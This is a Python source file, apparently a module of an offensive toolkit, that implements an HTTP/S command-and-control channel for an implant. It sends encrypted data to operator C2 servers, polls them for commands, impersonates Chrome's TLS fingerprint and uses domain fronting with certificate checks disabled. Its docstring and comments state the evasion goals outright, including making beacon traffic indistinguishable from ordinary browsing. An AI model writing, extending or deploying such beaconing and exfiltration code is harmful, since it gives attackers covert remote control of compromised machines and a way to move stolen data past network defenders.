"""
forge/utils/post/channels/http_channel.py
HTTP/S C2 channel backend — Module 5-G.

Features:
  - curl_cffi Chrome TLS fingerprint impersonation.
  - Domain fronting: Host header diverges from TLS SNI.
  - Realistic Chrome 122 / Windows 11 header set on every request.
  - AES-256-GCM payload encryption before transport.
  - Gaussian-jittered beacon intervals.
  - Multiple fallback C2 URLs tried in sequence on failure.
  - FORGE_OFFLINE_STRICT=1 disables all outbound requests.

OPSEC:
  - UA string derived from Phase 1 host profile (not hardcoded).
  - No port 4444, no plaintext command strings in HTTP body.
  - All beacon traffic indistinguishable from browser HTTPS session.
"""

from __future__ import annotations

import base64
import logging
import os
import random
import time
from typing import Optional

_LOG = logging.getLogger(__name__)
_OFFLINE = os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")

# Default Chrome 122 / Windows 11 header set
_DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Connection": "keep-alive",
}

# AES key placeholder — operator MUST replace before deployment
_KEY_PLACEHOLDER = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY"


class HTTPChannel:
    """
    HTTP/S C2 transport channel with domain fronting and AES-256-GCM encryption.

    Args:
        c2_urls:      Ordered list of C2 base URLs. Tried in sequence on failure.
        front_domain: CDN domain to use as TLS SNI (domain fronting).
                      When set, Host header = c2_url host; SNI = front_domain.
        session_key:  32-byte AES-256-GCM key (hex). Operator supplies at deploy.
        user_agent:   Override UA string. Defaults to Chrome 122 Windows 11.
        interval:     Base beacon interval in seconds (5–3600).
        jitter_pct:   Gaussian jitter ± percentage of interval (0–50).
    """

    def __init__(
        self,
        c2_urls: list[str],
        front_domain: Optional[str] = None,
        session_key: str = _KEY_PLACEHOLDER,
        user_agent: Optional[str] = None,
        interval: int = 60,
        jitter_pct: int = 20,
    ) -> None:
        if not c2_urls:
            raise ValueError("At least one C2 URL is required.")
        self._c2_urls = c2_urls
        self._front = front_domain
        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
        self._ua = user_agent or (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/122.0.0.0 Safari/537.36"
        )
        self._interval = interval
        self._jitter_pct = jitter_pct
        self._session = self._make_session()
        self._active_idx = 0

    # ── Public interface ───────────────────────────────────────────────────────

    def send(self, data: bytes) -> bool:
        """Encrypt and POST data to active C2 URL. Returns True on success."""
        if _OFFLINE:
            _LOG.debug("FORGE_OFFLINE_STRICT: HTTP send suppressed.")
            return False
        payload = self._encrypt(data)
        url = self._c2_urls[self._active_idx]
        for attempt, c2 in enumerate(self._rotate_c2()):
            try:
                headers = self._build_headers(c2)
                resp = self._session.post(c2, data=payload, headers=headers, timeout=15)
                if resp.status_code in (200, 204):
                    _LOG.debug("C2 send OK → %s", c2)
                    return True
                _LOG.debug("C2 send HTTP %d → %s", resp.status_code, c2)
            except Exception as exc:
                _LOG.debug("C2 send error (%s): %s", c2, exc)
        return False

    def recv(self, timeout: int = 30) -> Optional[bytes]:
        """Poll active C2 URL for a pending command. Returns decrypted bytes or None."""
        if _OFFLINE:
            return None
        for c2 in self._rotate_c2():
            try:
                headers = self._build_headers(c2)
                resp = self._session.get(f"{c2}/poll", headers=headers, timeout=timeout)
                if resp.status_code == 200 and resp.content:
                    return self._decrypt(resp.content)
                if resp.status_code == 204:
                    return None
            except Exception as exc:
                _LOG.debug("C2 recv error: %s", exc)
        return None

    def sleep(self) -> None:
        """Gaussian-jittered sleep between beacon cycles."""
        sigma = self._interval * (self._jitter_pct / 100)
        actual = max(5.0, random.gauss(self._interval, sigma))
        _LOG.debug("Beacon sleep %.1fs (jitter ±%d%%)", actual, self._jitter_pct)
        time.sleep(actual)

    def close(self) -> None:
        try:
            self._session.close()
        except Exception:
            pass

    # ── Internal ──────────────────────────────────────────────────────────────

    def _build_headers(self, c2_url: str) -> dict:
        from urllib.parse import urlparse

        headers = dict(_DEFAULT_HEADERS)
        headers["User-Agent"] = self._ua
        if self._front:
            # Domain fronting: Host header → real C2; SNI provided by front_domain
            # The curl_cffi session is configured with front_domain as SNI
            headers["Host"] = urlparse(c2_url).netloc
        return headers

    def _rotate_c2(self):
        """Yield C2 URLs starting from current active index, wrapping around."""
        n = len(self._c2_urls)
        for i in range(n):
            yield self._c2_urls[(self._active_idx + i) % n]

    def _encrypt(self, data: bytes) -> bytes:
        """AES-256-GCM encrypt. Returns b64-encoded nonce+tag+ciphertext."""
        if not self._key:
            return base64.b64encode(data)
        try:
            from Crypto.Cipher import AES
            from Crypto.Random import get_random_bytes

            nonce = get_random_bytes(12)
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            ct, tag = cipher.encrypt_and_digest(data)
            return base64.b64encode(nonce + tag + ct)
        except ImportError:
            _LOG.debug("pycryptodome not available; sending unencrypted (dev mode only)")
            return base64.b64encode(data)

    def _decrypt(self, raw: bytes) -> Optional[bytes]:
        if not self._key:
            return base64.b64decode(raw)
        try:
            from Crypto.Cipher import AES

            blob = base64.b64decode(raw)
            nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception as exc:
            _LOG.debug("Decrypt failed: %s", exc)
            return None

    def _make_session(self):
        try:
            from curl_cffi import requests as cffi_requests

            kwargs: dict = {"impersonate": "chrome122"}
            if self._front:
                kwargs["verify"] = False  # fronting uses CDN cert; no hostname match
            return cffi_requests.Session(**kwargs)
        except ImportError:
            import urllib.request

            class _FallbackSession:
                def post(self, url, **kw):
                    return type("R", (), {"status_code": 0, "content": b""})()

                def get(self, url, **kw):
                    return type("R", (), {"status_code": 0, "content": b""})()

                def close(self):
                    pass

            _LOG.warning("curl_cffi unavailable; HTTP channel degraded to no-op.")
            return _FallbackSession()
